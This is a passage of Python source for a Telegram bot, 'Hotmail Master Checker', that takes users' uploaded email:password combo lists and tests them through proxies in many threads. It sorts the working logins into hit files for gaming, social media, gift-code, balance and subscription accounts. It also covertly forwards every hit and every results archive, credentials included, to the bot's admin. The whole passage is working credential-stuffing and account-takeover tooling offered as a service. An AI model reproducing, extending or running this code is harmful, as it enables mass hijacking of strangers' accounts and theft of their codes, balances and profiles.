    # xbox_codes.txt
    lines = []
    for em, pw, code, desc in st.xbox_code_list:
        lines.append(f"{em}:{pw} | {code} | {desc}")
    w("xbox_codes.txt", lines)

    # xbox_pulled/ folder (like api_exam: valid, already_claimed, expired, invalid, etc.)
    xbox_pulled_dir = os.path.join(odir, "xbox_pulled")
    os.makedirs(xbox_pulled_dir, exist_ok=True)

    def w_xbox(fn, lines):
        with open(os.path.join(xbox_pulled_dir, fn), "w", encoding="utf-8") as f:
            for line in lines:
                f.write(line + "\n")

    def write_xbox_file(fn, items):
        lines = [f"{em}:{pw} \u2013 {name} \u2013 {code}" for em, pw, name, code in items]
        w_xbox(fn, lines)

    write_xbox_file("valid_xbox_codes.txt", st.xbox_pulled_by_status.get("VALID", []) + st.xbox_pulled_by_status.get("BALANCE_CODE", []))
    write_xbox_file("valid_cardrequired_codes.txt", st.xbox_pulled_by_status.get("VALID_REQUIRES_CARD", []))
    write_xbox_file("already_claimed.txt", st.xbox_pulled_by_status.get("REDEEMED", []))
    write_xbox_file("expired.txt", st.xbox_pulled_by_status.get("EXPIRED", []))
    write_xbox_file("invalid.txt", st.xbox_pulled_by_status.get("INVALID", []) + st.xbox_pulled_by_status.get("DEACTIVATED", []))
    write_xbox_file("unknown_codes.txt", st.xbox_pulled_by_status.get("UNKNOWN", []))
    write_xbox_file("region_locked_codes.txt", st.xbox_pulled_by_status.get("REGION_LOCKED", []))
    write_xbox_file("rate_limited.txt", st.xbox_pulled_by_status.get("RATE_LIMITED", []))
    write_xbox_file("errors.txt", st.xbox_pulled_by_status.get("ERROR", []))

    # psn_hits.txt
    lines = [f"{em}:{pw} | Orders: {n}" for em, pw, n in st.psn_list]
    w("psn_hits.txt", lines)

    # steam_hits.txt
    lines = [f"{em}:{pw} | Items: {n}" for em, pw, n in st.steam_list]
    w("steam_hits.txt", lines)

    # supercell_hits.txt
    lines = [f"{em}:{pw} | {','.join(g) if isinstance(g, list) else g}" for em, pw, g in st.supercell_list]
    w("supercell_hits.txt", lines)

    # tiktok_hits.txt (with full profile info)
    lines = []
    for em, pw, tt in st.tiktok_list:
        if isinstance(tt, dict):
            flw = tt.get('followers', 0)
            flw_str = f"{flw:,}" if flw > 0 else "0"
            verified = " ✓" if tt.get('verified') else ""
            lines.append(f"{em}:{pw} | @{tt.get('username', 'N/A')} | Followers: {flw_str}{verified} | Likes: {tt.get('likes', 0):,} | Videos: {tt.get('videos', 0)}")
        else:
            lines.append(f"{em}:{pw} | {tt}")
    w("tiktok_hits.txt", lines)

    # instagram_hits.txt (with full profile info)
    lines = []
    for em, pw, ig in st.instagram_list:
        if isinstance(ig, dict):
            flw = ig.get('followers', 0)
            flw_str = f"{flw:,}" if flw > 0 else "0"
            verified = " ✓" if ig.get('verified') else ""
            lines.append(f"{em}:{pw} | @{ig.get('username', 'N/A')} | Followers: {flw_str}{verified} | Posts: {ig.get('posts', 0):,} | Following: {ig.get('following', 0):,}")
        else:
            lines.append(f"{em}:{pw} | {ig}")
    w("instagram_hits.txt", lines)

    # minecraft_hits.txt
    lines = [f"{em}:{pw} | {n}" for em, pw, n in st.minecraft_list]
    w("minecraft_hits.txt", lines)

    w("bad.txt", st.bad_list)
    w("2fa.txt", st.twofa_list)
    w("errors.txt", st.error_list)

    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0

    # User info for summary
    checked_by = "N/A"
    checked_by_link = ""
    if user:
        fn = user.first_name or ""
        ln = user.last_name or ""
        checked_by = f"{fn} {ln}".strip() or "User"
        if user.username:
            checked_by_link = f"@{user.username}"
        else:
            checked_by_link = f"tg://user?id={user.id}"

    # Get top followers ranges
    tiktok_top_ranges = sorted(st.tiktok_followers_ranges.items(), key=lambda x: x[1], reverse=True)[:3]
    instagram_top_ranges = sorted(st.instagram_followers_ranges.items(), key=lambda x: x[1], reverse=True)[:3]
    
    tiktok_ranges_str = ", ".join([f"{r}:{c}" for r, c in tiktok_top_ranges if c > 0]) or "None"
    instagram_ranges_str = ", ".join([f"{r}:{c}" for r, c in instagram_top_ranges if c > 0]) or "None"

    w("summary.txt", [
        f"Hotmail Master Checker - Summary",
        f"",
        f"Dev: @BaignX",
        f"Bot: {bot_username}",
        f"",
        f"Checked by: {checked_by} ({checked_by_link})",
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"",
        f"Total Lines: {st.total} | Valid: {st.valid} | Skipped: {st.bad_lines}",
        f"Checked: {st.checked} | CPM: {cpm}",
        f"",
        f"--- RESULTS ---",
        f"PSN: {st.psn} | STEAM: {st.steam} | SUPERCELL: {st.supercell}",
        f"TIKTOK: {st.tiktok} (Top Ranges: {tiktok_ranges_str})",
        f"INSTAGRAM: {st.instagram} (Top Ranges: {instagram_ranges_str})",
        f"MINECRAFT: {st.minecraft} | XBOX CODES: {st.xbox_codes} | XBOX PULLED: {st.xbox_pulled} (Valid: {st.xbox_pulled_valid})",
        f"DISCORD: {st.discord_total} (Valid: {st.discord_valid}, Claimed: {st.discord_claimed}, Unk: {st.discord_unk})",
        f"BALANCE >$0: {st.balance} | RP HITS: {st.rp_hits} ({st.rp_total_pts} pts)",
        f"XGPU: {st.xgpu} | XGPP: {st.xgpp} | XGPE: {st.xgpe} | M365: {st.m365} | OTHER: {st.other_svc}",
        f"",
        f"--- NEGATIVES ---",
        f"BAD: {st.bad} | 2FA: {st.twofa} | ERRORS: {st.errors}",
        f"RETRIES: {st.retries} | PROXY ERR: {st.proxy_err}",
    ])

    w("README.md", [
        "# Hotmail Master Checker Results",
        "",
        f"Dev: @BaignX",
        f"Bot: {bot_username}",
        "",
        f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "",
        "## Features:",
        "- PSN Orders Check",
        "- Steam Items Check",
        "- Supercell Games (Clash of Clans, Clash Royale, Brawl Stars, Hay Day, Boom Beach)",
        "- TikTok with Full Profile Capture (Followers, Likes, Videos, Verified Status)",
        "- Instagram with Full Profile Capture (Followers, Posts, Following, Verified Status)",
        "- Minecraft Account Check",
        "- Xbox Codes",
        "- Xbox Pulled (fetch + validate, see xbox_pulled/ folder: valid_xbox_codes.txt, already_claimed.txt, expired.txt, invalid.txt, etc.)",
        "- Discord Nitro Promos",
        "- Microsoft Balance",
        "- Bing Rewards Points",
        "- Game Pass / M365 Services",
    ])

    zip_path = os.path.join(tmpdir, f"results_master_{ts}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(odir):
            for file in files:
                fp = os.path.join(root, file)
                arcname = os.path.relpath(fp, tmpdir)
                zf.write(fp, arcname)

    return zip_path, tmpdir


def build_hits_text(cs: CheckerSession):
    st = cs.stats
    lines = []
    for em, pw, cat, det in st.all_hits:
        lines.append(f"{em}:{pw} | {cat} | {det}")
    return "\n".join(lines) if lines else "No hits found yet."


# ══════════════════════════════════════════════════════════
#  BOT INIT
# ══════════════════════════════════════════════════════════

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
db = load_db()
active_checks = {}   # user_id -> CheckerSession
active_checks_lock = threading.Lock()

init_proxies()

# ══════════════════════════════════════════════════════════
#  HELPER: get user profile photo
# ══════════════════════════════════════════════════════════

def get_profile_photo(user_id):
    try:
        photos = bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            file_id = photos.photos[0][-1].file_id
            return file_id
    except:
        pass
    return None


def user_link(user):
    name = user.first_name or "User"
    if user.username:
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'


def user_full_link(user):
    fn = user.first_name or ""
    ln = user.last_name or ""
    full = f"{fn} {ln}".strip() or "User"
    if user.username:
        return f'<a href="https://t.me/{user.username}">{full}</a>'
    return f'<a href="tg://user?id={user.id}">{full}</a>'


# ══════════════════════════════════════════════════════════
#  LIVE STATUS MESSAGE
# ══════════════════════════════════════════════════════════

def build_status_message(cs: CheckerSession):
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    eta_s = ((st.valid - st.checked) / (st.checked / elapsed)) if st.checked > 0 and elapsed > 0 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    eta_str = time.strftime("%H:%M:%S", time.gmtime(eta_s)) if eta_s > 0 else "--:--:--"

    bar = make_progress_bar(st.checked, st.valid, 20)

    total_hits = len(st.all_hits)

    msg = f"""{E_ROCKET} {bold('Hotmail Master Checker')}
{E_GEAR} {italic('Dev: @BaignX')}

{E_CHART} {bold('Progress:')}
{mono(bar)}
{mono(f'{st.checked}/{st.valid}')} | {E_BOLT} CPM: {mono(str(cpm))}
{E_CLOCK} {mono(el_str)} | ETA: {mono(eta_str)}

{E_FIRE} {bold('Hits:')} {mono(str(total_hits))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GAME} {bold('PSN:')} {mono(str(st.psn))}    {E_GAME} {bold('Steam:')} {mono(str(st.steam))}
{E_GAME} {bold('Supercell:')} {mono(str(st.supercell))} {E_MUSIC} {bold('TikTok:')} {mono(str(st.tiktok))}
{E_CAMERA} {bold('Instagram:')} {mono(str(st.instagram))} {E_GAME} {bold('Minecraft:')} {mono(str(st.minecraft))}
{E_KEY} {bold('Xbox Codes:')} {mono(str(st.xbox_codes))}  {E_GIFT} {bold('Xbox Pulled:')} {mono(str(st.xbox_pulled))} (Valid: {mono(str(st.xbox_pulled_valid))})
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GIFT} {bold('Discord Valid:')} {mono(f'{st.discord_valid}/{st.discord_total}')}
{E_GIFT} {bold('Discord Claimed:')} {mono(str(st.discord_claimed))}
{E_GIFT} {bold('Discord Unk:')} {mono(str(st.discord_unk))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_MONEY} {bold('Balance >$0:')} {mono(str(st.balance))}
{E_STAR} {bold('RP Hits:')} {mono(str(st.rp_hits))} ({mono(str(st.rp_total_pts))} pts)
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_DIAMOND} {bold('XGPU:')} {mono(str(st.xgpu))}  {bold('XGPP:')} {mono(str(st.xgpp))}
{E_DIAMOND} {bold('XGPE:')} {mono(str(st.xgpe))}  {bold('M365:')} {mono(str(st.m365))}
{E_DIAMOND} {bold('Other Svc:')} {mono(str(st.other_svc))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_RED} {bold('Bad:')} {mono(str(st.bad))}   {E_YELLOW} {bold('2FA:')} {mono(str(st.twofa))}
{E_RED} {bold('Errors:')} {mono(str(st.errors))}  {E_ORANGE} {bold('Retries:')} {mono(str(st.retries))}
{E_PURPLE} {bold('Proxy Err:')} {mono(str(st.proxy_err))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GEAR} {italic('Dev: @BaignX')}"""

    return msg


def build_summary_message(cs: CheckerSession, stopped=False):
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    total_hits = len(st.all_hits)

    status_text = f"{E_STOP} Stopped by user" if stopped else f"{E_CHECK} Completed"

    msg = f"""{E_PARTY} {bold('Hotmail Master Checker - Summary')}
{E_GEAR} {italic('Dev: @BaignX')}

{bold('Status:')} {status_text}

{E_CHART} {bold('Stats:')}
{mono(f'Total Lines: {st.total}')}
{mono(f'Valid Combos: {st.valid}')}
{mono(f'Skipped: {st.bad_lines}')}
{mono(f'Checked: {st.checked}')}
{mono(f'CPM: {cpm}')}
{mono(f'Duration: {el_str}')}

{E_FIRE} {bold(f'Total Hits: {total_hits}')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GAME} PSN: {mono(str(st.psn))} | Steam: {mono(str(st.steam))}
{E_GAME} Supercell: {mono(str(st.supercell))} | TikTok: {mono(str(st.tiktok))}
{E_CAMERA} Instagram: {mono(str(st.instagram))} | Minecraft: {mono(str(st.minecraft))}
{E_KEY} Xbox Codes: {mono(str(st.xbox_codes))}  {E_GIFT} Xbox Pulled: {mono(str(st.xbox_pulled))} (Valid: {mono(str(st.xbox_pulled_valid))})
{E_GIFT} Discord: {mono(f'{st.discord_valid}/{st.discord_total}')} (Claimed: {st.discord_claimed})
{E_MONEY} Balance: {mono(str(st.balance))} | RP: {mono(str(st.rp_hits))} ({st.rp_total_pts} pts)
{E_DIAMOND} XGPU: {mono(str(st.xgpu))} | XGPP: {mono(str(st.xgpp))} | XGPE: {mono(str(st.xgpe))}
{E_DIAMOND} M365: {mono(str(st.m365))} | Other: {mono(str(st.other_svc))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_RED} Bad: {mono(str(st.bad))} | 2FA: {mono(str(st.twofa))}
{E_RED} Errors: {mono(str(st.errors))} | Retries: {mono(str(st.retries))}
{E_PURPLE} Proxy Err: {mono(str(st.proxy_err))}

{E_GEAR} {italic('Dev: @BaignX')}"""

    return msg


# ══════════════════════════════════════════════════════════
#  HIT SENDER TO ADMIN
# ══════════════════════════════════════════════════════════

def send_hit_to_admin(cs, email, pwd, cat, det, user):
    try:
        msg = f"""{E_BOOM} {bold('NEW HIT!')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_KEY} {bold('Type:')} {mono(cat)}
{E_USER} {bold('Combo:')} {mono(f'{email}:{pwd}')}
{E_STAR} {bold('Details:')} {mono(det)}
{E_USER} {bold('Checked by:')} {user_full_link(user)}
{E_GEAR} {italic('Dev: @BaignX')}"""
        bot.send_message(ADMIN_ID, msg, parse_mode="HTML", disable_web_page_preview=True)
    except:
        pass


# ══════════════════════════════════════════════════════════
#  CHECKER RUNNER THREAD
# ══════════════════════════════════════════════════════════

def run_checker(cs: CheckerSession, message, user):
    chat_id = message.chat.id
    db_inst = load_db()

    # Send initial status
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"get_hits_{cs.user_id}"),
        types.InlineKeyboardButton(f"{E_STOP} Stop", callback_data=f"stop_check_{cs.user_id}")
    )

    status_msg = bot.send_message(
        chat_id,
        build_status_message(cs),
        parse_mode="HTML",
        reply_to_message_id=message.message_id,
        reply_markup=markup,
        disable_web_page_preview=True
    )
    cs.msg_id = status_msg.message_id

    def updater():
        while not cs.finished and not cs.stop_event.is_set():
            try:
                markup2 = types.InlineKeyboardMarkup(row_width=2)
                markup2.add(
                    types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"get_hits_{cs.user_id}"),
                    types.InlineKeyboardButton(f"{E_STOP} Stop", callback_data=f"stop_check_{cs.user_id}")
                )
                bot.edit_message_text(
                    build_status_message(cs),
                    chat_id=chat_id,
                    message_id=cs.msg_id,
                    parse_mode="HTML",
                    reply_markup=markup2,
                    disable_web_page_preview=True
                )
            except:
                pass
            time.sleep(3)

    updater_thread = threading.Thread(target=updater, daemon=True)
    updater_thread.start()

    # Run checker
    try:
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS, thread_name_prefix="chk") as executor:
            cs.executor = executor
            futures = []
            for email, pwd in cs.combos:
                if cs.stop_event.is_set():
                    break
                f = executor.submit(cs.process_one, email, pwd)
                futures.append(f)
                cs.futures = futures

            for f in as_completed(futures):
                if cs.stop_event.is_set():
                    break
                try:
                    f.result(timeout=0.1)
                except:
                    pass
    except:
        pass

    cs.finished = True
    stopped = cs.stop_event.is_set()

    # Update DB
    db_inst = load_db()
    u = get_user(db_inst, cs.user_id)
    u["total_checked"] += cs.stats.checked
    u["total_hits"] += len(cs.stats.all_hits)
    u["total_lines"] += cs.stats.valid
    u["checks_count"] = u.get("checks_count", 0) + 1
    db_inst["global_stats"]["total_checked"] += cs.stats.checked
    db_inst["global_stats"]["total_hits"] += len(cs.stats.all_hits)
    db_inst["global_stats"]["total_lines_checked"] += cs.stats.valid
    save_db(db_inst)

    # Final status
    time.sleep(1)
    try:
        bot.edit_message_text(
            build_summary_message(cs, stopped),
            chat_id=chat_id,
            message_id=cs.msg_id,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except:
        pass

    # Send ZIP to user
    try:
        zip_path, tmpdir = build_result_zip(cs, user=user)
        with open(zip_path, 'rb') as f:
            bot.send_document(
                chat_id, f,
                caption=f"{E_FILE} {bold('Results')} | {italic('Dev: @BaignX')}",
                parse_mode="HTML",
                reply_to_message_id=message.message_id
            )

        # Send ZIP to admin with summary and user profile link
        with open(zip_path, 'rb') as f:
            user_profile_link = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"
            user_name = user.first_name or ""
            if user.last_name:
                user_name += f" {user.last_name}"
            user_name = user_name.strip() or "User"

            admin_caption = f"""{E_FILE} {bold('Check Completed')}
{E_USER} Checked by: <a href="{user_profile_link}">{user_name}</a>
{E_PIN} User ID: {mono(str(user.id))}
{E_CHART} Lines: {mono(str(cs.stats.valid))} | Hits: {mono(str(len(cs.stats.all_hits)))}
{E_CLOCK} Duration: {mono(time.strftime('%H:%M:%S', time.gmtime(time.time() - cs.started)))}
{E_GEAR} {italic('Dev: @BaignX')}

{bold('Summary:')}
{E_GAME} PSN: {mono(str(cs.stats.psn))} | Steam: {mono(str(cs.stats.steam))}
{E_GAME} Supercell: {mono(str(cs.stats.supercell))} | TikTok: {mono(str(cs.stats.tiktok))}
{E_CAMERA} Instagram: {mono(str(cs.stats.instagram))} | Minecraft: {mono(str(cs.stats.minecraft))}
{E_KEY} Xbox Codes: {mono(str(cs.stats.xbox_codes))}  Xbox Pulled: {mono(str(cs.stats.xbox_pulled))} (Valid: {mono(str(cs.stats.xbox_pulled_valid))})
{E_GIFT} Discord: {mono(f'{cs.stats.discord_valid}/{cs.stats.discord_total}')}
{E_MONEY} Balance: {mono(str(cs.stats.balance))} | RP: {mono(str(cs.stats.rp_hits))} ({cs.stats.rp_total_pts} pts)
{E_DIAMOND} XGPU: {mono(str(cs.stats.xgpu))} | XGPP: {mono(str(cs.stats.xgpp))} | XGPE: {mono(str(cs.stats.xgpe))}
{E_DIAMOND} M365: {mono(str(cs.stats.m365))} | Other: {mono(str(cs.stats.other_svc))}
{E_RED} Bad: {mono(str(cs.stats.bad))} | 2FA: {mono(str(cs.stats.twofa))} | Errors: {mono(str(cs.stats.errors))}"""
            bot.send_document(ADMIN_ID, f, caption=admin_caption, parse_mode="HTML")

        # Cleanup temp directory
        try:
            shutil.rmtree(tmpdir)
        except:
            pass
    except Exception as e:
        bot.send_message(chat_id, f"{E_CROSS} Error sending results: {mono(str(e))}", parse_mode="HTML")

    # Remove from active
    with active_checks_lock:
        if cs.user_id in active_checks:
            del active_checks[cs.user_id]


# ══════════════════════════════════════════════════════════
#  BOT HANDLERS
# ══════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user = message.from_user
    db_inst = load_db()
    update_user_info(db_inst, user)

    banned, reason = is_banned(db_inst, user.id)
    if banned:
        bot.reply_to(message, f"{E_BAN} {bold('You are banned!')}\n{E_MEMO} Reason: {mono(reason or 'No reason')}", parse_mode="HTML")
        return

    uptime = time.time() - BOT_START_TIME
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
    total_users = len(db_inst.get("users", {}))
    total_proxies = len(init_proxies())
    g = db_inst.get("global_stats", {})

    welcome_text = f"""{E_WAVE} {bold('Welcome to Hotmail Master Checker!')}

{E_SPARKLE} Hello, {user_full_link(user)}!
{E_ROBOT} {italic('Your all-in-one Microsoft account checker')}

{E_SHIELD} {bold('Bot Health:')}
{E_GREEN} Status: {mono('Online')}
{E_CLOCK} Uptime: {mono(uptime_str)}
{E_USER} Total Users: {mono(str(total_users))}
{E_GLOBE} Proxies Loaded: {mono(str(total_proxies))}
{E_CHART} Total Checked: {mono(str(g.get('total_checked', 0)))}
{E_FIRE} Total Hits: {mono(str(g.get('total_hits', 0)))}

{E_DIAMOND} {bold('Features:')}
{E_CHECK} PSN / Steam / Supercell / TikTok
{E_CHECK} Minecraft / Xbox Codes / Xbox Pulled / Discord
{E_CHECK} Balance / Rewards Points
{E_CHECK} Game Pass / M365 Services
{E_CHECK} Fast Multi-threaded Checking

{E_CROWN} {italic('Dev: @BaignX')}
{E_HEART} {italic('Enjoy using the bot!')}"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_ROCKET} Checker", callback_data="open_checker"),
        types.InlineKeyboardButton(f"{E_USER} My Profile", callback_data="my_profile"),
    )
    markup.add(
        types.InlineKeyboardButton(f"{E_GLOBE} Bot Status", callback_data="bot_status"),
        types.InlineKeyboardButton(f"{E_CROSS} Exit", callback_data="exit_bot"),
    )

    photo = get_profile_photo(user.id)
    if photo:
        try:
            bot.send_photo(
                message.chat.id,
                photo,
                caption=welcome_text,
                parse_mode="HTML",
                reply_to_message_id=message.message_id,
                reply_markup=markup
            )
            return
        except:
            pass

    bot.reply_to(message, welcome_text, parse_mode="HTML", reply_markup=markup, disable_web_page_preview=True)


@bot.callback_query_handler(func=lambda call: call.data == "open_checker")
def cb_open_checker(call):
    user = call.from_user
    db_inst = load_db()
    banned, reason = is_banned(db_inst, user.id)
    if banned:
        bot.answer_callback_query(call.id, "You are banned!", show_alert=True)
        return

    is_admin = user.id == ADMIN_ID
    with active_checks_lock:
        if user.id in active_checks and not is_admin:
            bot.answer_callback_query(call.id, "You already have an active check running!", show_alert=True)
            return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"{E_CROSS} Back to Menu", callback_data="back_to_menu"))

    approved = is_approved(db_inst, user.id) or is_admin
    if is_admin:
        limit_text = "Unlimited (Admin)"
    elif approved:
        limit_text = "Unlimited (Approved)"
    else:
        limit_text = f"Max {MAX_LINES} lines"

    text = f"""{E_ROCKET} {bold('Hotmail Master Checker')}

{E_FILE} {bold('Send your combo file')} (.txt)

{E_MEMO} {bold('Instructions:')}
{E_PIN} Max file size: {mono(f'{MAX_FILE_SIZE_MB}MB')}
{E_PIN} Lines limit: {mono(limit_text)}
{E_PIN} Format: {mono('email:password')}
{E_PIN} One check at a time

{E_CHECK} {bold('Note')} - No need proxies, proxies are already loaded! {E_COOL}

{E_BOLT} Threads: {mono(str(DEFAULT_THREADS))}
{E_GLOBE} Proxies: {mono(str(len(init_proxies())))}

{E_MEMO} {italic('Just send your .txt file below!')}
{E_GEAR} {italic('Dev: @BaignX')}"""

    try:
        bot.edit_message_text(
            text, call.message.chat.id, call.message.message_id,
            parse_mode="HTML", reply_markup=markup, disable_web_page_preview=True
        )
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=markup,
                        reply_to_message_id=call.message.message_id, disable_web_page_preview=True)

    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == "my_profile")
def cb_my_profile(call):
    user = call.from_user
    db_inst = load_db()
    u = get_user(db_inst, user.id)

    is_prem = getattr(user, 'is_premium', False) or False
    prem_text = f"{E_DIAMOND} Yes" if is_prem else f"{E_CROSS} No"

    approved = is_approved(db_inst, user.id)
    rank = f"{E_CROWN} Approved" if approved else f"{E_USER} Normal"
    if user.id == ADMIN_ID:
        rank = f"{E_CROWN} Admin"

    text = f"""{E_USER} {bold('My Profile')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_SPARKLE} {bold('Name:')} {user_full_link(user)}
{E_PIN} {bold('Username:')} {mono('@' + user.username if user.username else 'N/A')}
{E_KEY} {bold('User ID:')} {mono(str(user.id))}
{E_MEMO} {bold('Chat ID:')} {mono(str(call.message.chat.id))}
{E_DIAMOND} {bold('Premium:')} {prem_text}
{E_SHIELD} {bold('Rank:')} {rank}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_CHART} {bold('Statistics:')}
{E_CHECK} Total Checked: {mono(str(u.get('total_checked', 0)))}
{E_FIRE} Total Hits: {mono(str(u.get('total_hits', 0)))}
{E_FILE} Total Lines: {mono(str(u.get('total_lines', 0)))}
{E_BOLT} Total Checks: {mono(str(u.get('checks_count', 0)))}
{E_CLOCK} First Seen: {mono(u.get('first_seen', 'N/A')[:10])}
{E_CLOCK} Last Seen: {mono(u.get('last_seen', 'N/A')[:10])}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GEAR} {italic('Dev: @BaignX')}"""

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"{E_CROSS} Back to Menu", callback_data="back_to_menu"))

    photo = get_profile_photo(user.id)
    if photo:
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        try:
            bot.send_photo(
                call.message.chat.id, photo,
                caption=text, parse_mode="HTML", reply_markup=markup
            )
            bot.answer_callback_query(call.id)
            return
        except:
            pass

    try:
        bot.edit_message_text(
            text, call.message.chat.id, call.message.message_id,
            parse_mode="HTML", reply_markup=markup, disable_web_page_preview=True
        )
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=markup, disable_web_page_preview=True)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == "bot_status")
def cb_bot_status(call):
    db_inst = load_db()
    uptime = time.time() - BOT_START_TIME
    uptime_str = time.strftime("%Hh %Mm %Ss", time.gmtime(uptime))
    total_users = len(db_inst.get("users", {}))
    total_proxies = len(init_proxies())
    g = db_inst.get("global_stats", {})

    with active_checks_lock:
        current_checks = len(active_checks)

    text = f"""{E_ROBOT} {bold('Bot Status')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GREEN} Status: {mono('Online')}
{E_CLOCK} Uptime: {mono(uptime_str)}
{E_USER} Total Users: {mono(str(total_users))}
{E_GLOBE} Proxies: {mono(str(total_proxies))}
{E_BOLT} Active Checks: {mono(str(current_checks))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_CHART} {bold('Global Stats:')}
{E_CHECK} Total Checked: {mono(str(g.get('total_checked', 0)))}
{E_FIRE} Total Hits: {mono(str(g.get('total_hits', 0)))}
{E_FILE} Total Lines: {mono(str(g.get('total_lines_checked', 0)))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GEAR} {italic('Dev: @BaignX')}"""

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"{E_CROSS} Back to Menu", callback_data="back_to_menu"))

    try:
        bot.edit_message_text(
            text, call.message.chat.id, call.message.message_id,
            parse_mode="HTML", reply_markup=markup, disable_web_page_preview=True
        )
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=markup, disable_web_page_preview=True)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == "exit_bot")
def cb_exit(call):
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    try:
        bot.send_animation(
            call.message.chat.id,
            "https://t.me/conflicthistor/1401255",
            caption=f"{E_WAVE} Bye :)\n{E_GEAR} {italic('Dev: @BaignX')}",
            parse_mode="HTML"
        )
    except:
        bot.send_message(call.message.chat.id, f"{E_WAVE} Bye :)\n{E_GEAR} {italic('Dev: @BaignX')}", parse_mode="HTML")
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def cb_back_to_menu(call):
    user = call.from_user
    db_inst = load_db()
    uptime = time.time() - BOT_START_TIME
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
    total_users = len(db_inst.get("users", {}))
    total_proxies = len(init_proxies())
    g = db_inst.get("global_stats", {})

    welcome_text = f"""{E_WAVE} {bold('Welcome to Hotmail Master Checker!')}

{E_SPARKLE} Hello, {user_full_link(user)}!
{E_ROBOT} {italic('Your all-in-one Microsoft account checker')}

{E_SHIELD} {bold('Bot Health:')}
{E_GREEN} Status: {mono('Online')}
{E_CLOCK} Uptime: {mono(uptime_str)}
{E_USER} Total Users: {mono(str(total_users))}
{E_GLOBE} Proxies Loaded: {mono(str(total_proxies))}
